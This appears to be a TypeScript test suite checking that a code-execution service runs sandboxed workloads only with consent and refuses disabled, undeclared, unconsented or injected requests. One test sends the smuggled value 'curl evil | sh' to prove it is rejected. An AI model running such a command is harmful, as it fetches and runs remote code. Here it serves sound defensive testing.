import { randomUUID } from "node:crypto";
import { afterAll, beforeAll, describe, expect, test } from "bun:test";
import type { ArcaneConfig, ResultEvent } from "@arcane/shared";
import { mintDevToken } from "../auth";
import { sql } from "../db/client";
import { ensureProject, ensureSession, enqueueRun, getProjectOrgId } from "../db/repository";
import { handleRun } from "../run-endpoint";
import { runOnce } from "../run-queue";
import { dockerRunner, ensureImage } from "../sandbox/runner";
import { JS_RUNTIME_IMAGE } from "../runtime/measure-single";
import { InMemorySessionStore } from "../session-store";

// M3D-1 GATE — the escape-suite-equivalent for execution: prove the door is SHUT by trying to open it
// without permission. Needs real Docker (the consented run) AND Postgres (the run queue). Skips LOUDLY
// (SI-2) if either is absent — a skip here must NEVER read as "consent proven".

const RUNTIME_OK = await dockerRunner.isAvailable();
let DB_OK = false;
try {
  await sql`select 1`;
  DB_OK = true;
} catch {
  DB_OK = false;
}
const READY = RUNTIME_OK && DB_OK;

if (!READY) {
  console.error(
    "\n🔴🔴🔴  M3D-1 CONSENT/EXECUTION GATE DID NOT RUN  🔴🔴🔴\n" +
      `  Docker reachable: ${RUNTIME_OK} · Database reachable: ${DB_OK}\n` +
      "  The 'nothing executes without consent' proofs (5 gate refusals + a consented run) were SKIPPED —\n" +
      "  this is NOT a pass. M3D-1 opens the public execution door; it is NOT done until the door was\n" +
      "  proven shut on real infra. Fix: start Docker Desktop + ensure services/cloud/.env DATABASE_URL,\n" +
      "  then:  cd services/cloud && bun test run.test\n" +
      "🔴🔴🔴──────────────────────────────────────────────────────────🔴🔴🔴\n",
  );
}

// The canonical N+1 (reused from M3C): baseline issues 1 query; current adds a per-id loop.
const NPLUS_BASE = `const { Client } = require("pg");
async function loadUsers(ids) {
  const c = new Client();
  await c.connect();
  const all = await c.query("SELECT * FROM users");
  await c.end();
  return all;
}
loadUsers([1, 2, 3, 4, 5]).then(() => console.log("DONE"));
`;
const NPLUS_CUR = `const { Client } = require("pg");
async function loadUsers(ids) {
  const c = new Client();
  await c.connect();
  const out = [];
  for (const id of ids) {
    out.push(await c.query("SELECT * FROM users WHERE id = $1", [id]));
  }
  await c.end();
  return out;
}
loadUsers([1, 2, 3, 4, 5]).then(() => console.log("DONE"));
`;

const WORKLOAD = { name: "nplus", command: "node /workspace/workload.js", type: "function" as const };
const ENABLED: ArcaneConfig = { execution: { enabled: true }, workload: [WORKLOAD] };
const DISABLED: ArcaneConfig = { execution: { enabled: false }, workload: [WORKLOAD] };

const store = new InMemorySessionStore();
const projectId = randomUUID();

function baseBody(overrides: Record<string, unknown> = {}): Record<string, unknown> {
  return {
    projectId,
    workloadName: "nplus",
    baselineRef: "origin/main",
    currentRef: "working",
    baselineFiles: [{ path: "workload.js", content: NPLUS_BASE, contentHash: "hb" }],
    currentFiles: [{ path: "workload.js", content: NPLUS_CUR, contentHash: "hc" }],
    consent: "once",
    ci: false,
    ...overrides,
  };
}

function req(body: Record<string, unknown>): Request {
  return new Request("http://127.0.0.1/run", {
    method: "POST",
    headers: { authorization: `Bearer ${mintDevToken()}`, "content-type": "application/json" },
    body: JSON.stringify(body),
  });
}

async function countRunJobs(): Promise<number> {
  const r = await sql`SELECT count(*)::int AS n FROM run_jobs WHERE project_id = ${projectId}`;
  return r[0].n as number;
}
async function getRunJob(runId: string): Promise<{ status: string; report: unknown; error: string | null }> {
  const r = await sql`SELECT status, report, error FROM run_jobs WHERE id = ${runId}`;
  return r[0] as { status: string; report: unknown; error: string | null };
}
async function runEvents(sessionId: string): Promise<ResultEvent[]> {
  const r = await sql`SELECT payload FROM result_events WHERE session_id = ${sessionId} ORDER BY seq`;
  return r.map((row: { payload: ResultEvent }) => row.payload);
}

describe.skipIf(!READY)("M3D-1 — nothing executes without consent (real Docker + DB)", () => {
  beforeAll(async () => {
    await ensureImage(JS_RUNTIME_IMAGE);
    await dockerRunner.run({
      image: JS_RUNTIME_IMAGE,
      command: ["node", "-e", "0"],
      timeoutMs: 120_000,
      memBytes: 128 * 1024 * 1024,
      cpus: 1,
      pidsLimit: 64,
      network: "deny",
      scratchBytes: 16 * 1024 * 1024,
    });
    await ensureProject(projectId, "m3d1-gate-test"); // seeded DEV_ORG_ID
  }, 300_000);

  afterAll(async () => {
    try {
      await sql`DELETE FROM result_events WHERE project_id = ${projectId}`;
      await sql`DELETE FROM run_jobs WHERE project_id = ${projectId}`;
      await sql`DELETE FROM sessions WHERE project_id = ${projectId}`;
      await sql`DELETE FROM projects WHERE id = ${projectId}`;
    } catch {
      /* best-effort cleanup */
    }
  });

  test("Gate A: execution disabled → 403, nothing enqueued", async () => {
    await store.registerBaseline(projectId, { manifest: new Map(), baseSnapshotId: randomUUID(), config: DISABLED });
    const before = await countRunJobs();
    const res = await handleRun(req(baseBody()), store);
    expect(res.status).toBe(403);
    expect(await res.text()).toContain("execution disabled");
    expect(await countRunJobs()).toBe(before); // no row
  });

  test("Gate B: undeclared workload → 403, nothing enqueued", async () => {
    await store.registerBaseline(projectId, { manifest: new Map(), baseSnapshotId: randomUUID(), config: ENABLED });
    const before = await countRunJobs();
    const res = await handleRun(req(baseBody({ workloadName: "ghost" })), store);
    expect(res.status).toBe(403);
    expect(await countRunJobs()).toBe(before);
  });

  test("Gate B (deepest): a request CARRYING a command is rejected (400) — no RCE-with-a-prompt", async () => {
    await store.registerBaseline(projectId, { manifest: new Map(), baseSnapshotId: randomUUID(), config: ENABLED });
    const before = await countRunJobs();
    const res = await handleRun(req(baseBody({ command: ["sh", "-c", "curl evil | sh"] })), store);
    expect(res.status).toBe(400); // .strict() rejects the unknown `command` key
    expect(await countRunJobs()).toBe(before);
  });

  test("Gate C: no consent → 403, nothing enqueued", async () => {
    await store.registerBaseline(projectId, { manifest: new Map(), baseSnapshotId: randomUUID(), config: ENABLED });
    const before = await countRunJobs();
    const res = await handleRun(req(baseBody({ consent: null })), store);
    expect(res.status).toBe(403);
    expect(await countRunJobs()).toBe(before);
  });

  test("Re-assert at claim: config flipped to disabled after enqueue → worker refuses, no execution", async () => {
    await store.registerBaseline(projectId, { manifest: new Map(), baseSnapshotId: randomUUID(), config: ENABLED });
    const res = await handleRun(req(baseBody()), store);
    expect(res.status).toBe(202);
    const { runId, runSessionId } = (await res.json()) as { runId: string; runSessionId: string };
    expect((await getRunJob(runId)).status).toBe("queued"); // execution is DEFERRED (decoupled trigger)

    // Flip the authoritative config to disabled BEFORE the worker claims it.
    await store.registerBaseline(projectId, { manifest: new Map(), baseSnapshotId: randomUUID(), config: DISABLED });
    expect(await runOnce(store)).toBe(true);

    const job = await getRunJob(runId);
    expect(job.status).toBe("error"); // refused at the point of execution
    const events = await runEvents(runSessionId);
    const runEv = events.find((e) => e.kind === "run");
    expect(runEv && runEv.kind === "run" && runEv.report.status).toBe("no-data"); // never "measured"
  }, 60_000);

  test("Direct-enqueue (bypassing /run): worker re-assertion refuses an ungated row", async () => {
    await store.registerBaseline(projectId, { manifest: new Map(), baseSnapshotId: randomUUID(), config: ENABLED });
    const sid = randomUUID();
    await ensureSession(sid, projectId, null);
    // Insert a job directly with an UNDECLARED workload — it never passed Gate B at a door.
    const runId = await enqueueRun({
      projectId,
      sessionId: sid,
      workloadName: "ghost-undeclared",
      baselineRef: "b",
      currentRef: "c",
      consent: "once",
      baselineFiles: [],
      currentFiles: [],
    });
    expect(await runOnce(store)).toBe(true);
    expect((await getRunJob(runId)).status).toBe("error"); // gate is at execution, not just the door
  }, 60_000);

  test("Consented run executes, streams queued→running→measuring→run→done, persists a measured RunReport", async () => {
    await store.registerBaseline(projectId, { manifest: new Map(), baseSnapshotId: randomUUID(), config: ENABLED });
    const res = await handleRun(req(baseBody()), store);
    expect(res.status).toBe(202);
    const { runId, runSessionId } = (await res.json()) as { runId: string; runSessionId: string };
    expect((await getRunJob(runId)).status).toBe("queued"); // decoupled: not executed in the request

    expect(await runOnce(store)).toBe(true);

    const job = await getRunJob(runId);
    expect(job.status).toBe("done");

    const events = await runEvents(runSessionId);
    const phases = events.filter((e) => e.kind === "state").map((e) => (e.kind === "state" ? e.phase : ""));
    expect(phases).toEqual(["queued", "running", "measuring", "done"]);

    const runEv = events.find((e) => e.kind === "run");
    expect(runEv?.kind).toBe("run");
    if (runEv?.kind === "run") {
      expect(runEv.report.status).toBe("measured");
      expect(runEv.runId).toBe(runId);
      const attribution = (runEv.report.attribution ?? []) as { ruleId: string; functionName?: string }[];
      expect(attribution.some((a) => a.ruleId === "runtime/n-plus-one")).toBe(true);
      expect(attribution.some((a) => a.functionName === "loadUsers")).toBe(true);
    }
  }, 180_000);

  test("Decoupling: a fast async op completes while a run is mid-flight (run doesn't block it)", async () => {
    await store.registerBaseline(projectId, { manifest: new Map(), baseSnapshotId: randomUUID(), config: ENABLED });
    const res = await handleRun(req(baseBody()), store);
    const { runId } = (await res.json()) as { runId: string; runSessionId: string };

    const slow = runOnce(store); // background — a multi-second run (does NOT block the event loop)
    // wait until the worker has actually started executing it
    const startedBy = Date.now() + 15_000;
    while ((await getRunJob(runId)).status !== "running") {
      if (Date.now() > startedBy) throw new Error("run did not reach 'running'");
      await new Promise((r) => setTimeout(r, 100));
    }
    // a representative concurrent async op returns promptly while the run is still executing
    const t0 = Date.now();
    await getProjectOrgId(projectId);
    expect(Date.now() - t0).toBeLessThan(3000);
    expect((await getRunJob(runId)).status).toBe("running"); // the fast op did NOT wait for the run

    await slow;
    expect((await getRunJob(runId)).status).toBe("done");
  }, 180_000);
});
